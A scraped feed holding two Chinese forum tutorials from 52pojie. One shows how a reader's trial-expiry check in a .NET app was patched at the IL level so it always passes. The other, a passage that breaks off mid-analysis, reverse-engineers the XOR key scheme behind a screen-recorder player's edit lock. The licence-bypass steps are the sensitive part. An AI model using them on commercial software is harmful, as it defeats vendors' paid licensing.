src="https://wechat2rss.xlab.app/img-proxy/?k=60bcfc0e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqU81fXTvdhXt00q0iaBjiaso45a3zOK2gLnqR9NdzibII9cr06T2QQxJic9A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="745" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>对于一个刚开始打工的牛马来说，掏钱那是万万不可能的。所以我先尝试在网上寻找有没有“学习版”来使用一下。但是这个软件好像太小众了，52里也没有相关的资源。</span><br /><span>然后我就开始琢磨着自己尝试</span>破解<span>一下。首先先跟着论坛里的新手导航帖学习了一下工具的使用，发现通常破解的第一步是要先确定软件是用什么语言编写或用什么软件编译的。</span><br /><span>那么我就试着先给这个软件拖到DIE里看一看。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3c782594&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUHFEqgeqQDlrZwTWMjeAKsZw2602hKPXrMgibQkLq9p0SibWdnsknibia1A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="722" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>发现他使用了一个叫.NET Framework的库，刚好我在浏览新手导航帖的时候发现有一个Blue大佬的.NET系列教程，于是我就去拜读了一下大佬的第一篇教程。</span><br /><span>首先使用NETReflector8软件打开需要破解的阅读器软件。并在搜索栏搜索充值弹窗的字符串，看看能不能从代码上下文找到突破口。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=5380ffd2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUNssIN4NCWWVCNpJGvuzpUianN6B8OrzKosYW3AMaPpYicvmzbtYuOyKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>搜索后发现只有一个CheckOverDue的函数里有包含这个字符串，那么点进去看看。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=6e101a09&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUXyCDg2ty1QTmicjhgeJ0URNrAVGPTAPh2VjhGZSlk4ACctusTWXRiatQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>运气很好，一下就找到了控制弹窗出现的逻辑。仔细分析一下这个函数，这个函数的作用是检查用户的试用期限是否到期。</span><br /><span>首先将用户的状态与一个叫OverDue的变量进行比较，如果不相等就直接返回true。那跟着看看状态函数和OverDue变量。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d277c880&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUTt9lX1N0FXO6UxAlFCnRsKicNuxiaCQQlbGBiboK4Z6t3ib3VzVwibCicypw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="877" /> <img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=1926060c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUSowb0HSspBvCsjpJ7YtQHoBpNPibuuujdZseDfEL2cngA7BJWguNflw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1019" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>可以看到OverDue是一个值为-1的常亮，而状态函数里如果用户的使用时间超过了软件设置的时间，则会使状态等于OverDue，那么在checkOverDue这个函数里的第一个判断语句里，判断的值一定就为False，没有办法到达return true的语句，所以就会进行第二个判断，并弹出需要充值的弹窗。</span><br /><span>那么现在问题的关键就已经找到了，只需要使checkOverDue这个函数永远也无法到达第二个判断语句，那么我们就不会再触发充值弹窗了。首先使用reflexil1插件看一下checkOverDue的IL代码。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3dda90bf&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUPaAbJmoWrWNich1Cfbh7QQoHcB8d6gUaz27tt9KcdVK6xDktXSJg8Uw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>发现02行代码中，使用bne.un.s来比较status与-1的值，经过网上查阅发现，ben.un.s操作码的作用是如果两个值不相等，则执行后面的语句。</span><br /><span>但是前面分析发现现在status的值一定是等于-1的，那是不是意味着，如果我把这个代码的逻辑改为，两个值相等就执行后面的语句，就可以直接返回true,而避开第二个判断语句了？</span><br /><span>说干就干，在网上查阅发现beq.s操作码的作用是如果两个值相等，则执行后面的语句，所以可以使用reflexil1插件将02行代码中的ben.un.s操作码改为beq.s操作码。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=0f69da23&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUxscsicc5nMO8kiaYrR83QG7yAFPRpcSTAWavxERLcGFHBiawCdATE7MkQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="930" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>点击update，再使用reflexil1插件保存后，打开软件试一试。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=f05644ed&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUY91HlddS54Smns6syao0X8HVpkx325eVichu1XFZ9xzwn71ZxE9zyzw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="769" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>可以看到现在已经可以成功打开小说阅读了，这次的破解就完成了。</span><br /><span>但是后面仔细思考了之后发现，目前改的这个逻辑，只适用于已经到期了的用户。如果是一个新用户，就会出现他明明有试用天数，但是却会弹出充值窗口。</span><br /><span>后来发现可以将CheckOverDue函数的逻辑改为，不管怎样，都直接返回true，这样无论是哪一个用户，都可以有无限的试用。</span><br /><span>最终CheckOverDue函数修改代码如下，主要是将第00行代码，改为直接用一个ldc.i4.1操作码向栈中存入一个1，也就是true值。</span><br /><span>然后将第01行代码改为ret操作码，ret操作码的作用就和return一样，返回一个值。</span><br /><span>最后将第02行代码删除，保存后即可成功破解。</span><br /><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=79f03f4e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUlslJYfgbRnUTylkrVKdLQSQiaoXBngCPEeWjYM6HKLWDHGjoTGfAYUA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="1080" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1949654-1-1.html">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=f89e8988&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141093%26idx%3D1%26sn%3Dabcba6bfd4b896957c83ae4c64b0669d%26chksm%3Dbd50a3b18a272aa751100e480c25700596f784c656649cd7888569066676e5caa7870d09fa63%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Wed, 14 Aug 2024 16:50:20 +0800</pubDate>
</item>
<item>
<title>解除《屏幕录像专家》EXE 播放器的 “编辑加密” 锁定</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141055&amp;idx=1&amp;sn=3ecd9d00265e4df3ee8002864be0df3c&amp;chksm=bd50a3eb8a272afd09362907ca830f232dcfb686b3750a2d5633d577c26ae56c44890e26ba20&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141055&amp;idx=1&amp;sn=3ecd9d00265e4df3ee8002864be0df3c&amp;chksm=bd50a3eb8a272afd09362907ca830f232dcfb686b3750a2d5633d577c26ae56c44890e26ba20&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-08-08 15:25</span> <span style="display: inline-block;">北京</span>
</p>

<p>想着将论坛 2015 年录制的入门教程翻录到更方便、通用的 MP4 格式，方便观赏。在网上晃了一圈发现也有其它人翻录，或做了音频降噪处理；不过没变的是右上角的文字水印和时间戳。因为设置了“编辑加密”锁定，所以。。。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=a81317c2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZL4XgG125RiaR6iaofsiaN1nCn4icNZIsdRdF8b47SvGUaXM1ljoLQQYtRYZ57wOnSQHMF6iceObn1k79Q%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：爱飞的猫</span></strong></span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p>作者：爱飞的猫@52pojie.cn</p><h2>前言</h2><p>想着将论坛 2015 年录制的入门教程翻录到更方便、通用的 MP4 格式，方便观赏。</p><p>在网上晃了一圈发现也有其它人翻录，或做了音频降噪处理；不过没变的是右上角的文字水印和时间戳。</p><p>因为设置了“编辑加密”锁定，因此无法直接通过屏幕录像专家主程序来去除这些文字再导出，就试着解除这个锁定。</p><p>解锁前后的状态：</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d558fd78&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL4XgG125RiaR6iaofsiaN1nCnSJYd0gvjwzaCXaRQeaQFW9rU6NZ6pgicU0Ef8gFI3935CVgibS6ClVKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>（当然也可以直接去掉水印然后翻录，最终的效果和文件大小都大差不差）</p><h2>题外话</h2><h3>为什么要解除“编辑加密”锁定</h3><p>为了生成便携影音格式。EXE 播放器已经不是主流，从现在来看也有很多缺点：</p><ul><li style="margin-left: 2px;"><p>不能跨平台播放（虽然看他官网有个适配安卓的播放器）</p></li><li style="margin-left: 2px;"><p>无法倍速播放（只能 2 倍速，且倍速播放无音频）</p></li><li style="margin-left: 2px;"><p>无法透过浏览器播放 / 上传到在线流媒体平台</p></li><li style="margin-left: 2px;"><p>只能进行简单的后期编辑。</p></li></ul><h3>《屏幕录像专家》免费平替</h3><p>目前更好用的免费、开源替代是 OBS。</p><p>除非有特殊需求，OBS 应为录制教程的首选。</p><h2>准备工作</h2><p>逆向的时候用到了这些工具，不过文章并没有详细解释工具的用法，需要读者自行摸索：</p><ul><li style="margin-left: 2px;"><p>x64dbg 调试器 - 爱盘 | 官方快照构建</p></li><li style="margin-left: 2px;"><p>IDA - 8.3 绿色版 - 静态逆向分析</p></li><li style="margin-left: 2px;"><p>IDR (Interactive Delphi Reconstructor) - Delphi 逆向分析辅助程序</p></li><li style="margin-left: 2px;"><p>十六进制编辑器 - 010Editor | HxD</p></li><li style="margin-left: 2px;"><p>文件对比工具 - WinMerge | Beyond Compare</p></li></ul><p>※ 读者应当有一定的逆向工具使用经验。部分分析过程没有详细解释操作，而是思路。</p><p>第六课课件：</p><ul><li style="margin-left: 2px;"><p>《吾爱破解培训第六课：潜伏在程序身边的黑影--实战给程序补丁》 讲师：我是用户</p></li><li style="margin-left: 2px;"><p>百度网盘</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>包含解锁<span style="font-weight: 700;">前后</span>的第六课录像、通用解锁工具 v0.1.5 和对应源码。如果读者已通过其它方式下载到第六课的原件，也可以使用解锁工具进行转换来得到解锁后的文件。</p></li></ul></ul><p>同时也借助了 Hmily 提供的“编辑加密”锁定之前的原始文件用于对比参考。</p><h2>开始逆向</h2><p>准备好了吗？开始了哦！</p><h3>内幕消息</h3><p>H 大在我之前做了一点初步的分析，做了个 bindiff 列出二者的区别，以及关键部分的算法。</p><p>bindiff 节选：</p><table width="1628"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">地址</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">大小</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">未加密</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">“编辑加密”锁定后</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">B9C37h</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">14h</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">96 4A FE 49 F4 3D 70 91 FE 75 E7 A3 D6 8F F1 9B 73 59 8F 80</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">EE D6 32 34 FD 45 24 D4 48 0A 12 31 72 B4 9A EC 50 2F 04 3C</code></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">CC2D0h</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">14h</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">9F C2 32 79 02 66 A0 A0 25 F7 62 FB AD 0D 51 DF 64 79 48 A1</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">E7 5E DF 04 6F D6 FD 65 54 17 8A 85 72 7A 8E A4 2F 5F 3B 8B</code></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">...</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);">都是 <code style="font-family: Consolas, Monaco, ;">14h</code> 或 <code style="font-family: Consolas, Monaco, ;">13h</code> 字节更改的情况</td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><br /></td></tr><tr style="border-top: 1px solid rgb(198, 203, 209); background-color: rgb(246, 248, 250);"><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">37A65BBh</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">2h</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">00 00</code></td><td style="padding: 6px 13px; border-color: rgb(198, 203, 209);"><code style="font-family: Consolas, Monaco, ;">25 3B</code></td></tr></tbody></table><p>以及关键的解密循环：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(198, 197, 254);">lb_00402B37:</span><br />  <span style="color: rgb(150, 203, 254);">xor</span> esi,esi                        <span style="color: rgb(146, 255, 184);">; 计数器</span><br />  <span style="color: rgb(150, 203, 254);">lea</span> edx,dword ptr ss:[ebp-D4]      <span style="color: rgb(146, 255, 184);">; 密钥 1</span><br />  <span style="color: rgb(150, 203, 254);">lea</span> eax,dword ptr ss:[ebp-E8]      <span style="color: rgb(146, 255, 184);">; 解密后的内容</span><br /><span style="color: rgb(198, 197, 254);"><br />lb_00402B45:</span><br />  <span style="color: rgb(150, 203, 254);">mov</span> ecx,<span style="color: rgb(255, 115, 253);">14</span><br />  <span style="color: rgb(150, 203, 254);">sub</span> ecx,esi                        <span style="color: rgb(146, 255, 184);">; ecx = 0x14 - 计数器</span><br />  <span style="color: rgb(150, 203, 254);">inc</span> esi                            <span style="color: rgb(146, 255, 184);">; 计数器自增</span><br />  <span style="color: rgb(150, 203, 254);">mov</span> cl,byte ptr ss:[ebp+ecx-C0]    <span style="color: rgb(146, 255, 184);">; 密钥 2 (偏移 = ecx)</span><br />  <span style="color: rgb(150, 203, 254);">xor</span> cl,byte ptr ds:[eax]           <span style="color: rgb(146, 255, 184);">; xor 原文</span><br />  <span style="color: rgb(150, 203, 254);">xor</span> cl,byte ptr ds:[edx]           <span style="color: rgb(146, 255, 184);">; xor 密钥 1 内容</span><br />  <span style="color: rgb(150, 203, 254);">inc</span> edx<br />  <span style="color: rgb(150, 203, 254);">mov</span> byte ptr ds:[eax],cl           <span style="color: rgb(146, 255, 184);">; 储存结果到原文位置</span><br />  <span style="color: rgb(150, 203, 254);">inc</span> eax<br />  <span style="color: rgb(150, 203, 254);">cmp</span> esi,<span style="color: rgb(255, 115, 253);">14</span>                         <span style="color: rgb(146, 255, 184);">; 一共处理 0x14 字节</span><br />  <span style="color: rgb(150, 203, 254);">jl</span> lb_00402B45</code></pre><p>（关键点让我自己来找的话，估计又要花几个小时了）</p><p>看着很复杂，但整理到高级语言后其实还行：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">char</span>* edx = ptr_d4;    <span style="color: rgb(146, 255, 184);">// ebp-D4</span><br /><span style="color: rgb(255, 255, 182);">char</span>* eax = ptr_e8;    <span style="color: rgb(146, 255, 184);">// ebp-E8</span><br /><span style="color: rgb(255, 255, 182);">char</span>* var_c0 = ptr_c0; <span style="color: rgb(146, 255, 184);">// ebp-C0</span><br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">0x14</span>; i++) {<br />  eax[i] = eax[i] ^ edx[i] ^ var_c0[<span style="color: rgb(255, 115, 253);">0x14</span> - i];<br />}</code></pre><p>（注意代码会跳过 <code style="font-family: SFMono-Regular, Consolas, ;">C0[0]</code> 的值，这不是文章的错误，而是播放器代码如此）</p><p>解密算法得到了，现在还差两项内容：</p><ul><li style="margin-left: 2px;"><p>密钥如何得到？</p></li><li style="margin-left: 2px;"><p>帧储存在哪里？如何定位修改点？</p></li></ul><h3>密钥来源</h3><p>首先想办法搞明白密钥从哪来。</p><p>稍微看看之前的代码，可以发现它会检查大小是否超过 <code style="font-family: SFMono-Regular, Consolas, ;">10240</code>。如果未超过则不进行解密处理。</p><p>在检查长度之后的地方，用 x64dbg 设置条件断点，使其在即将解密的时候打印各项目的值：</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=c43b360c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL4XgG125RiaR6iaofsiaN1nCnd3XEs9YScibMibF7MUcIKibeWZeqylEibPUVowq1CXgc6bVde4icwbH6k8w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">断点地址    <span style="color: rgb(255, 115, 253);">00402</span>B37<br />暂停条件    <span style="color: rgb(255, 115, 253);">0</span><br />日志文本    d4: {mem;<span style="color: rgb(255, 115, 253);">14</span><span style="color: rgb(150, 203, 254);">@ebp-D4</span>} / e8: {mem;<span style="color: rgb(255, 115, 253);">14</span><span style="color: rgb(150, 203, 254);">@ebp-E8</span>} / c0: {mem;<span style="color: rgb(255, 115, 253);">14</span><span style="color: rgb(150, 203, 254);">@ebp-C0</span>}<br />日志条件    <span style="color: rgb(255, 115, 253);">1</span></code></pre><p>然后跑起来，看看日志：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(168, 255, 96);">第一段:</span><br />  d4: <span style="color: rgb(168, 255, 96);">789CCC7D09785445B67FF592A43B6B771242BA89</span>  <span style="color: rgb(168, 255, 96);">&lt;-</span> <span style="color: rgb(168, 255, 96);">密钥</span> <span style="color: rgb(255, 115, 253);">1</span><br />  e8: <span style="color: rgb(168, 255, 96);">EED63234FD4524D4480A123172B49AEC502F043C</span>  <span style="color: rgb(168, 255, 96);">&lt;-</span> <span style="color: rgb(168, 255, 96);">密文</span> <span style="color: rgb(168, 255, 96);">(解密后覆盖为明文)</span><br />  c0: <span style="color: rgb(255, 115, 253);">3135313431000000000000000000000000000000</span>  <span style="color: rgb(168, 255, 96);">&lt;-</span> <span style="color: rgb(168, 255, 96);">密钥</span> <span style="color: rgb(255, 115, 253);">2</span><br /><span style="color: rgb(168, 255, 96);">第二段:</span><br />  d4: <span style="color: rgb(168, 255, 96);">789CED7D6DB05DC571E0E87EDF77DF7B7A12421F</span><br />  e8: <span style="color: rgb(168, 255, 96);">E75EDF046FD6FD6554178A85727A8EA42F5F3B8B</span><br />  c0: <span style="color: rgb(255, 115, 253);">3135313431000000000000000000000000000000</span><br /><span style="color: rgb(168, 255, 96);">第三段：</span><br />  d4: <span style="color: rgb(168, 255, 96);">789CED7D59CC65D955DEAE3BFF53D5DF735563D3</span><br />  e8: <span style="color: rgb(168, 255, 96);">605CF1EF4359370F9196881782A75BD2A6634043</span><br />  c0: <span style="color: rgb(255, 115, 253);">3135313431000000000000000000000000000000</span></code></pre><p>观察上述数据：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ebp-D4</code> 的内容每次都不一样，但是开头都是 <code style="font-family: SFMono-Regular, Consolas, ;">78 9C</code>，可以在原文件找到。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ebp-E8</code> 就是加密后改变的 <code style="font-family: SFMono-Regular, Consolas, ;">0x14</code> 长度内容，可以在原文件找到。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ebp-C0</code> 是固定值，文件内找不到（注意解密时第一个字节 <code style="font-family: SFMono-Regular, Consolas, ;">31</code> 不参与运算）。</p></li></ul><p>此外，对 <code style="font-family: SFMono-Regular, Consolas, ;">DecompressImage_4027BC</code> 进行交叉检索可以得到下述可能的调用路径：</p><ul><li style="margin-left: 2px;"><p>(初始化) <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_FormShow</code> → <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay2(...)</code> → <code style="font-family: SFMono-Regular, Consolas, ;">DecompressImage_4027BC(...)</code></p></li><li style="margin-left: 2px;"><p>(播放时) <code style="font-family: SFMono-Regular, Consolas, ;">sub_403ACC</code> → <code style="font-family: SFMono-Regular, Consolas, ;">RenderFrame_405B80(PlayForm, ...)</code> → <code style="font-family: SFMono-Regular, Consolas, ;">DecompressImage_4027BC(...)</code></p></li></ul><h4>文件密钥 (<code style="font-family: Consolas, Monaco, ;">ebp-C0</code>)</h4><p><code style="font-family: SFMono-Regular, Consolas, ;">ebp-C0</code> 处的文件密钥每个文件都不一致，储存在 <code style="font-family: SFMono-Regular, Consolas, ;">[_PlayForm]+338</code> 处。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; 